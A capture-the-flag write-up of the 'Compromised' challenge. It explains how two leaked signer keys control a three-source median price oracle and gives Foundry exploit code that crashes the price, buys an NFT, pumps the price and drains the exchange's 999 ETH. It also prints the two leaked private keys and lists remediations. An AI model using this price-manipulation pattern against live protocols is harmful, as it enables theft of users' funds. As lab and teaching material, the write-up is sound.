# 08 — Compromised

**Class:** Leaked oracle signer keys → median price manipulation
**Goal:** Steal the exchange's 999 ETH into the recovery account, ending with
the NFT price back at its original value and the player holding no NFT.

## The setup

`TrustfulOracle` prices the `DVNFT` collectible as the **median** of prices
reported by 3 trusted sources:

```solidity
function _computeMedianPrice(string memory symbol) private view returns (uint256) {
    uint256[] memory prices = getAllPricesForSymbol(symbol);
    LibSort.insertionSort(prices);
    if (prices.length % 2 == 0) { ... }
    else {
        return prices[prices.length / 2]; // middle element of 3
    }
}
```

`Exchange` buys and sells the NFT at that oracle price, with no cooldown, no
staleness check, and no per-block limit. A leaked HTTP response exposes two
hex-encoded, base64-encoded strings — decoding them yields the raw private
keys of `sources[0]` and `sources[1]`, two of the oracle's three trusted
reporters:

```
0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
```

`vm.addr` on each confirms they resurrect `0x188...088` and `0xA41...9D8`
exactly.

## Root cause

**2 of 3 trusted price sources are compromised**, and the median of 3 values
is fully controlled by any 2 of them: whatever price both colluding sources
report, that value *is* the median, regardless of what the third (honest)
source says.

```
sorted([X, X, honest]) → middle element is always X,
whether honest < X or honest > X.
```

There's no minimum quorum of *independent* sources, no bound on how far a
report can move between updates, and no on-chain mechanism distinguishes a
legitimate price update from a hijacked signer pushing an arbitrary number.

## Exploit — crash it, buy, pump it, sell

```solidity
// Both compromised sources report 0 → median crashes to 0.
vm.prank(compromisedSource1);
oracle.postPrice("DVNFT", 0);
vm.prank(compromisedSource2);
oracle.postPrice("DVNFT", 0);

// Buy the NFT for free.
vm.prank(player);
uint256 tokenId = exchange.buyOne{value: 1}();

// Both compromised sources report the exchange's full balance → median pumps back up.
vm.prank(compromisedSource1);
oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
vm.prank(compromisedSource2);
oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

// Sell it back at the inflated price, draining the exchange.
vm.startPrank(player);
nft.approve(address(exchange), tokenId);
exchange.sellOne(tokenId);
payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
vm.stopPrank();
```

No flash loan, no reentrancy, no arithmetic trick — just two ordinary
`postPrice` calls from EOAs whose keys shouldn't have been reachable, sandwiching
a buy and a sell. Since the target pump price (999 ETH) equals
`INITIAL_NFT_PRICE`, the median lands back exactly where it started, so
`_isSolved`'s price-unchanged check passes for free — no separate "restore"
step needed.

## Remediation

- **Never let key compromise of a minority of sources move the aggregate.**
  A 3-source median is broken by design — 2-of-3 collusion is total control.
  Use enough independent sources that the honest majority always dominates
  (e.g. Chainlink's node operator set), or require a real quorum threshold.
- **Bound price movement per update/block.** A circuit breaker that rejects
  reports deviating too far from the last accepted price would have capped
  the damage of both the crash and the pump.
- **Rotate and scope signer keys properly.** The keys were exposed via an
  unrelated HTTP leak — secrets belonging to price-feed signers need the same
  operational rigor as validator or custodial keys: no plaintext transit, no
  logging, hardware-backed storage.

## Real-world parallel

Compromised signer keys behind a price feed is not hypothetical — it's the
same failure class behind incidents like the Mango Markets oracle
manipulation and various centralized "trusted reporter" bridges/oracles
getting drained the moment an operator key leaked. Any oracle whose security
model reduces to "trust N keys" is only as strong as its weakest majority.
